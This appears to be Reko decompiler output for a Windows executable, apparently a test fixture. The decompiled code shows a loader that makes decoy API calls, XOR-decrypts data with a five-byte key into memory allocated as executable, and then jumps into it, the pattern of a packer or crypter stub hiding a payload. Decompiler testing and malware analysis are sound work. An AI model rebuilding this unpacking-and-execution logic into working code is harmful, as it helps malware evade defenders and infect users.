// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 1310E000: Register word32 fn1310E000(Stack (ptr byte) dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack (ptr word32) dwArg10, Stack word32 dwArg14, Stack int32 dwArg18)
word32 fn1310E000(byte * dwArg04, word32 dwArg08, word32 dwArg0C, word32 * dwArg10, word32 dwArg14, int32 dwArg18)
{
	*dwArg10 = dwArg0C;
	word16 wLoc10_104 = (word16) (uint32) ((uint64) (uint32) dwArg14 % 0x05);
	byte * dwArg08_28 = dwArg08 + dwArg14;
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		*dwArg04 = (byte) ((int32) *dwArg08_28 ^ (word32) (*((word32) ((int32) wLoc10_104) + dwArg18)));
		word16 cx_83 = wLoc10_104 + 0x01;
		wLoc10_104 = cx_83;
		if ((int32) cx_83 == 0x05)
			wLoc10_104 = 0x00;
		dwArg04 = dwArg04 + 0x01;
		dwArg08_28 = dwArg08_28 + 0x01;
	}
	return dwArg0C;
}

// 1310E09B: Register word32 fn1310E09B(Register word32 ebp)
word32 fn1310E09B(word32 ebp)
{
	SetErrorMode(0x5C000000);
	word32 esp_25;
	word32 ebp_26;
	byte SCZO_27;
	word32 eax_28;
	word32 edi_29;
	word32 ecx_30;
	byte SZO_31;
	byte C_32;
	word32 edx_33;
	byte Z_34;
	word32 esi_35;
	word32 ebx_36;
	byte dl_37;
	ADVAPI32.dll!WmiReceiveNotificationsA();
	GetStartupInfoA(fp - 660);
	word32 ebp_65;
	byte SCZO_66;
	word32 eax_67;
	word32 edi_68;
	word32 ecx_69;
	byte SZO_70;
	byte C_71;
	word32 edx_72;
	byte Z_73;
	word32 esi_74;
	word32 ebx_75;
	byte dl_76;
	ptr32 esp_129;
	ADVAPI32.dll!WmiSetSingleInstanceW();
	HRESULT eax_47 = SafeArrayGetUBound(null, 0x0006C000, (LONG *) 0x00012C00);
	if (edx_72 != 0x03EC0000 && eax_67 + 0x80040199 == eax_47 + ~0x0002FE66)
	{
		word32 ebx_322 = *((word32) eax_47 - 1828067671);
		*(esp_129 - 0x04) = fp - 0x0234;
		*(esp_129 - 0x08) = 0x00;
		*(esp_129 - 0x0C) = fp - 0x10;
		*(esp_129 - 0x10) = 0x04;
		*(esp_129 - 0x14) = fp - 0x023C;
		*(esp_129 - 0x18) = fp - 0x023C;
		fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
		Eq_164 edi_347 = *((word32) eax_47 - 1828067667);
		*(esp_129 - 0x04) = fp - 0x0234;
		*(esp_129 - 0x08) = 0x04;
		*(esp_129 - 0x0C) = fp - 0x10;
		*(esp_129 - 0x10) = 0x04;
		*(esp_129 - 0x14) = fp - 0x025C;
		*(esp_129 - 0x18) = fp - 600;
		fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
		Eq_210 edi_370 = *((word32) eax_47 - 0x6CF6194F);
		*(esp_129 - 0x04) = fp - 0x0234;
		*(esp_129 - 0x08) = 0x08;
		*(esp_129 - 0x0C) = fp - 0x10;
		*(esp_129 - 0x10) = 0x04;
		*(esp_129 - 0x14) = fp - 0x1C;
		*(esp_129 - 0x18) = fp - 0x14;
		fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
		*(esp_129 - 0x04) = 0x00;
		Eq_262 eax_397 = GetModuleHandleA(*(esp_129 - 0x04));
		Eq_271 eax_404 = *((word32) eax_47 - 0x6CF6194B);
		*(esp_129 - 0x08) = fp - 0x0234;
		*(esp_129 - 0x0C) = 0x0C;
		*(esp_129 - 0x10) = fp - 0x10;
		*(esp_129 - 0x14) = 0x04;
		*(esp_129 - 0x18) = fp - 0x28;
		*(esp_129 - 0x1C) = fp - 0x1C;
		fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
		dwLoc0248 = (Eq_319) *((word32) eax_47 - 1828067655);
		*(esp_129 - 0x08) = fp - 0x0234;
		*(esp_129 - 0x0C) = 0x10;
		*(esp_129 - 0x10) = fp - 0x10;
		*(esp_129 - 0x14) = 0x04;
		*(esp_129 - 0x18) = fp - 600;
		*(esp_129 - 0x1C) = fp - 0x0248;
		fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
		*(esp_129 - 0x08) = 0x40;
		*(esp_129 - 0x0C) = 0x3000;
		Eq_319 eax_467 = edi_370 * 0x08 + 0x0C;
		Mem477[esp_129 - 0x10 + 0x00:word32] = eax_467 + edi_347 + ebx_322;
		*(esp_129 - 0x14) = 0x00;
		dwLoc023C = ebx_322;
		dwLoc0258 = edi_347;
		dwLoc14 = edi_370;
		dwLoc20 = eax_397;
		dwLoc024C = 0x14;
		dwLoc24 = eax_47 + 2466899645;
		dwLoc2C = eax_467;
		esp_129 = esp_129 - 0x14;
		dwLoc0260 = VirtualAlloc(*(esp_129 - 0x14), *(esp_129 - 0x10), *(esp_129 - 0x0C), *(esp_129 - 0x08));
		dwLoc0C = eax_404 + eax_397 + eax_467;
		dwLoc0264 = eax_467;
		dwLoc08 = 0x00;
		dwLoc18 = 0x00;
	}
	while (0x01 != 0x00)
	{
		if (dwLoc0264 == dwLoc0248)
		{
			Eq_210 edx_240 = (word32) dwLoc08.dw0000 + 0x01;
			dwLoc08 = edx_240;
			if (edx_240 == dwLoc14)
				break;
			Eq_541 edx_246 = *((char *) &dwLoc24->t9309E6B9.t0000.t0000 + 1828067655);
			ptr32 * esp_249 = esp_129 - 0x04;
			*esp_249 = fp - 0x0234;
			*(esp_249 - 0x04) = dwLoc024C;
			*(esp_249 - 0x08) = fp - 0x10;
			*(esp_249 - 0x0C) = 0x04;
			*(esp_249 - 0x10) = fp - 0x1C - dwLoc024C;
			*(esp_249 - 0x14) = fp - 0x1C;
			fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			word32 esi_276 = dwLoc24 + 0x04;
			dwLoc0248 = (Eq_319) esi_276->t0000.t0000;
			*esp_249 = fp - 0x0234;
			ui32 ebx_273 = dwLoc024C + 0x04;
			*(esp_249 - 0x04) = ebx_273;
			*(esp_249 - 0x08) = fp - 0x10;
			*(esp_249 - 0x0C) = 0x04;
			*(esp_249 - 0x10) = fp - 0x0248 - ebx_273;
			*(esp_249 - 0x14) = fp - 0x0248;
			fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			dwLoc024C = ebx_273 + 0x04;
			dwLoc24 = esi_276 + 0x04;
			dwLoc0264 = 0x00;
			dwLoc0C = edx_246 + dwLoc20;
		}
		*((char *) dwLoc0260 + dwLoc18) = (Eq_406) dwLoc0C.t0000->unused;
		dwLoc0C = dwLoc0C + 0x01;
		dwLoc18 = dwLoc18 + 0x01;
		dwLoc0264 = dwLoc0264 + 0x01;
	}
	ptr32 * esp_136 = esp_129 - 0x04;
	*esp_136 = fp - 0x0234;
	(esp_136 - 0x04)->t0000.t0000 = dwLoc2C;
	*(esp_136 - 0x08) = fp - 0x0238;
	(esp_136 - 0x0C)->t0000 = (LPVOID) dwLoc0258;
	*(esp_136 - 0x10) = (LPVOID *) (dwLoc0260 - dwLoc2C);
	*(esp_136 - 0x14) = (LPVOID *) dwLoc0260;
	word32 eax_161 = fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*esp_136 = fp;
	*(esp_136 - 0x04) = fp - 0x0234;
	(esp_136 - 0x08)->t0000 = (LPVOID) dwLoc0258;
	*(esp_136 - 0x0C) = dwLoc023C;
	*(esp_136 - 0x10) = (LPVOID *) dwLoc0260;
	word32 esi_184 = dwLoc0260 + dwLoc0258;
	*(esp_136 - 0x14) = (LPVOID *) esi_184;
	word32 esp_188;
	word32 ebp_189;
	byte SCZO_190;
	word32 eax_191;
	word32 edi_192;
	word32 ecx_193;
	byte SZO_194;
	byte C_195;
	word32 edx_196;
	byte Z_197;
	word32 esi_198;
	word32 ebx_199;
	byte dl_200;
	(dwLoc0260 + 0x0F50)();
	return eax_191;
}

// 1310E4E5: Register Eq_408 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	fs->ptr0000 = fp - 0x14;
	word32 esp_36;
	word32 ebp_37;
	word32 eax_38;
	struct Eq_653 * fs_39;
	byte SCZO_40;
	word32 ebx_41;
	word32 esi_42;
	word32 edi_43;
	byte SZO_44;
	byte C_45;
	word32 ecx_46;
	byte Z_47;
	byte al_48;
	byte bl_49;
	byte CZ_50;
	_set_app_type();
	word32 esp_53;
	word32 ebp_54;
	word32 * eax_55;
	struct Eq_670 * fs_56;
	byte SCZO_57;
	word32 ebx_58;
	word32 esi_59;
	word32 edi_60;
	byte SZO_61;
	byte C_62;
	word32 ecx_63;
	byte Z_64;
	byte al_65;
	byte bl_66;
	byte CZ_67;
	_p__fmode();
	*eax_55 = 0x00;
	word32 ebp_73;
	word32 * eax_74;
	struct Eq_690 * fs_75;
	byte SCZO_76;
	word32 ebx_77;
	word32 esi_78;
	word32 edi_79;
	byte SZO_80;
	byte C_81;
	word32 ecx_82;
	byte Z_83;
	byte al_84;
	byte bl_85;
	byte CZ_86;
	ptr32 esp_277;
	_p__commode();
	*eax_74 = 0x00;
	word32 eax_92 = *adjust_fdiv;
	fn1310E63E();
	if (eax_92 == 0x00)
	{
		*(esp_277 - 0x04) = 0x0DA00000;
		word32 esp_261;
		word32 ebp_262;
		word32 eax_263;
		struct Eq_854 * fs_264;
		byte SCZO_265;
		word32 ebx_266;
		word32 esi_267;
		word32 edi_268;
		byte SZO_269;
		byte C_270;
		word32 ecx_271;
		byte Z_272;
		byte al_273;
		byte bl_274;
		byte CZ_275;
		_setusermatherr();
		esp_277 = esp_261 + 0x04;
	}
	fn1310E629();
	ptr32 * esp_98 = esp_277 - 0x04;
	*esp_98 = fp - 0x80;
	*(esp_98 - 0x04) = fp - 0x80;
	ptr32 esp_102;
	word32 ebp_103;
	word32 eax_104;
	struct Eq_740 * fs_105;
	byte SCZO_106;
	word32 ebx_107;
	word32 esi_108;
	word32 edi_109;
	byte SZO_110;
	byte C_111;
	word32 ecx_112;
	byte Z_113;
	byte al_114;
	byte bl_115;
	byte CZ_116;
	initterm();
	*(esp_102 - 0x04) = fp - 0x70;
	*(esp_102 - 0x08) = eax_92;
	*(esp_102 - 0x0C) = fp - 0x68;
	*(esp_102 - 0x10) = fp - 116;
	*(esp_102 - 0x14) = fp - 100;
	ptr32 esp_134;
	word32 ebp_135;
	word32 eax_136;
	struct Eq_790 * fs_137;
	byte SCZO_138;
	word32 ebx_139;
	word32 esi_140;
	word32 edi_141;
	byte SZO_142;
	byte C_143;
	word32 ecx_144;
	byte Z_145;
	byte al_146;
	byte bl_147;
	byte CZ_148;
	_getmainargs();
	*(esp_134 - 0x04) = fp - 0x80;
	*(esp_134 - 0x08) = fp - 0x80;
	struct Eq_817 * esp_154;
	word32 ebp_155;
	word32 eax_156;
	struct Eq_820 * fs_157;
	byte SCZO_158;
	word32 ebx_159;
	word32 esi_160;
	word32 edi_161;
	byte SZO_162;
	byte C_163;
	word32 ecx_164;
	byte Z_165;
	byte al_166;
	cu8 bl_167;
	byte CZ_168;
	initterm();
	cu8 * esi_171 = *acmdln;
	if (*esi_171 == 0x22)
	{
		do
		{
			esi_171 = esi_171 + 0x01;
			cu8 al_238 = *esi_171;
		} while (al_238 != bl_167 && al_238 != 0x22);
		if (*esi_171 == 0x22)
		{
l1310E5AA:
			esi_171 = esi_171 + 0x01;
		}
	}
	else
	{
		while (*esi_171 > 0x20)
			esi_171 = esi_171 + 0x01;
	}
	cu8 al_180 = *esi_171;
	if (al_180 == bl_167 || al_180 > 0x20)
	{
		word32 eax_195;
		esp_154->t0020 = fp - 0x60;
		GetStartupInfoA(esp_154->t0020);
		if (0x00 != 0x00)
			eax_195 = (word32) wLoc30;
		else
		{
			esp_154->dw001C = 0x0A;
			eax_195 = esp_154->dw001C;
		}
		esp_154->dw001C = eax_195;
		esp_154->ptr0018 = esi_171;
		esp_154->dw0014 = 0x00;
		esp_154->t0010 = null;
		esp_154->t000C = GetModuleHandleA(esp_154->t0010);
		esp_154->dw002E = fn1310E09B(ebp_155);
		exit(esp_154->dw002E);
	}
	goto l1310E5AA;
}

// 1310E629: void fn1310E629()
void fn1310E629()
{
	word32 esp_6;
	word32 ecx_7;
	controlfp();
}

// 1310E63E: void fn1310E63E()
void fn1310E63E()
{
}

